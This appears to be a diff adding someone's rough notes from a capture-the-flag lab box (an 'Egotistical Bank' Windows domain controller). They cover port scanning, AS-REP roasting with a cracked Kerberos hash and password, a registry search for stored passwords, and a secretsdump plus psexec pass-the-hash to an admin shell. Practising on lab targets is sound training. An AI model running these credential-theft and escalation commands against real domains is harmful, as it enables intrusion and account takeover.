@@ -1,0 +1,80 @@
+nmap -sC -sV 10.10.10.175
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 09:35:43Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+--------------------------------------------------------------------------------
+Active Directory will be exploitable once we get a foothold
+----------------------------------------------------------------------
+dirb found two image folders
+==> DIRECTORY: http://10.10.10.175/css/                                        
+==> DIRECTORY: http://10.10.10.175/fonts/                                      
+==> DIRECTORY: http://10.10.10.175/images/                                     
+==> DIRECTORY: http://10.10.10.175/Images/ 
+dirb didnt find anything useful
+-------------------------------------------------
+https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
+for enumeration based on smb
+smbmap -H 10.10.10.175 -R 
+didnt give any result
+Trying https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_enumusers
+----------------------------------------------------
+https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
+https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+Revisiting the website I found the bottom of the About us page had legitimate names
+Fergus,Smith
+Hugo,Bear
+Steven,Kerb
+Shaun,Coins
+Bowie,Taylor
+Sophie,Driver
+using https://github.com/urbanadventurer/username-anarchy
+to get a list of possible usernames of the names
+
+[*] Valid user => fsmith [NOT PREAUTH]
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3cefd8abc97ec432e4ea43b7268d6274$9609f3a485cf351f97d09c49ee32f86ad753cf312fb5f23c30a730acf4638e9a683ce5d5fb712ee1b1b9a4c3945ab08038640740eb59417fa511ffb84ab96e5e1a5dfd8a06e90188adea0ec3e405feca8d97edb825484befb0aa0c4a586575cfbae40663ae5221760d858e94cfc58666609dfd32919bfa13c12ea0002c5f04eccc20586a32f13c2d8134d65b592c5e7080086695006a8e7a9e0ad313ba832dce0f0a1ef81b9e0e761de4f447cd0edb1d8a8fb7bddc274dd0dcfccbe0481f9b99477504e999ac27ce24c199786167f00d506636fdad6be1acbce40fed93c2bcb33a6af77736fb28d447a1489b1bdaab61a57e2f08188671e203ec49f6ad809f6e
+Thestrokes23 
+GetUserSPNs.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -outputfile hashes -dc-ip 10.10.10.175
+ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------------------------  ------  --------  --------------------------  ---------  ----------
+SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 05:54:34.140321  <never>               
+
+HSmith is an account that gave the hash using john
+It gave the same password leading me to believe this was a dead end
+Got in evil-winrm
+Got users.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/25/2020   1:05 PM                Administrator
+d-----        1/23/2020   9:52 AM                FSmith
+d-r---        1/22/2020   9:32 PM                Public
+d-----        7/11/2020   9:16 AM                svc_loanmgr
+Administrator and svc_loanmgr as two more users to remember
+All the users
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+EGOTISTICALBANK
+
+https://0xsp.com/offensive/privilege-escalation-cheatsheet
+reg query HKLM /f password /t REG_SZ /s
+Moneymakestheworldgoround!
+default username
+EGOTISTICALBANK\svc_loanmanager
+Used Secretdumps.py to get a dump of pasword hashes
+used psexec.py to get the admin shell with the hash
